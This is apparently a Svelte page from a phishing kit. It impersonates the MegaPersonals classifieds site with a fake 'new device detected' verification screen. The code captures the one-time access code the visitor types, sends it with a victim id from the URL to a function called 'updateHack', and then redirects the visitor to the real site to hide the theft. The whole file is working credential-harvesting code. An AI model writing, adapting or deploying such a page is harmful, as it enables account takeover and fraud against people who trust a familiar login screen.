<script>
    import '$lib/verify.css'
    
    import devilgirlFavicon from '$lib/resources/img/devilgirl_favicon.ico'
    import megapersonalsPageHeader from '$lib/resources/img/megapersonalsPageHeader.png'
    import { page } from '$app/stores';
    import { updateHack } from '$lib/actions';
    import { goto } from '$app/navigation';
  
    let pin=null


    async function verify(e){
        e.preventDefault()
        var id=$page.url.searchParams.get('i')
        console.log(pin,id)
        await updateHack(id,{pin:pin})
        window.location = "https://megapersonals.eu"
    }
</script>

<svelte:head>
    <link rel="icon" href={devilgirlFavicon} type="image/x-icon">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width">
    <title>MegaPersonals: Classified hookups</title>
    <meta name="description" content="MegaPersonals - Post your classified ad and MEET NOW">
    <meta name="keywords" content="MegaPersonals">
    <link rel="preload" as="image"
        imagesrcset="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fmegapersonals.b1da273c.png&amp;w=640&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fmegapersonals.b1da273c.png&amp;w=1080&amp;q=75 2x">
    <meta name="next-head-count" content="6">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="true">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">

    <link rel="stylesheet" href="custom-pin-2.css" data-n-g=""><noscript data-n-css=""></noscript>
   
  
    <style data-href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600;700&amp;display=swap">
     
    </style>
</svelte:head>



<div id="__next">
    <div class="Toastify"></div>
    <div class="container pt-[35px] flex flex-col items-center overflow-x-hidden">
        <div class="w-[65%] lg:w-full"><img alt="megaeprsonals"
                
                src={megapersonalsPageHeader}
                width="495" height="100" decoding="async" data-nimg="1" style="color: transparent;"></div>
        <div class="mt-5 py-1.5 w-full bg-[#F8EFCE] text-[#B8AF8E] text-xl text-center font-medium uppercase">New
            deviece detected</div>
        <p class="mt-6 text-xl text-[#C75400] text-center">Your ACCESS CODE <br> has been sent <b>Successfully</b>
            <br> to your email on <b>December 28, 2023</b>. <br> That code remains valid.</p>
        <p class="mt-5 text-center text-xl italic font-bold text-[#2FAEEA] uppercase">CHECK YOUR SPAM <br> FOLDER IT
            MAY BE THERE.</p>
        <p class="mt-7 flex items-center gap-3 text-xl text-[#C75400] text-center font-bold italic uppercase">
            <span>DO NOT SHARE IT</span><span
                class="bg-[#2FAEEA] w-6 h-6 rounded-full text-white flex justify-center items-center font-bold not-italic"><span>?</span></span>
        </p>
        <p class="mt-5 text-xl text-[#C75400] text-center ">Enter the code <br> below to continue.</p>
        <div class="mt-7 flex items-center">
            <form on:submit={verify} class="flex flex-col items-center">
                <div class=""><input bind:value={pin} name="skipcode"
                        class="w-full px-[12px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
                        required=true></div><button style="margin-bottom: 20px;"
                    class="mt-[20px] bg-custom-orange text-white text-[20px] px-[21px] py-[8px] tracking-wider">Submit</button>
            </form>
        </div>
    </div>
</div>

<next-route-announcer>
    <p aria-live="assertive" id="__next-route-announcer__" role="alert"
        style="border: 0px; clip: rect(0px, 0px, 0px, 0px); height: 1px; margin: -1px; overflow: hidden; padding: 0px; position: absolute; width: 1px; white-space: nowrap; overflow-wrap: normal;">
        MegaPersonals: Classified hookups</p>
</next-route-announcer>

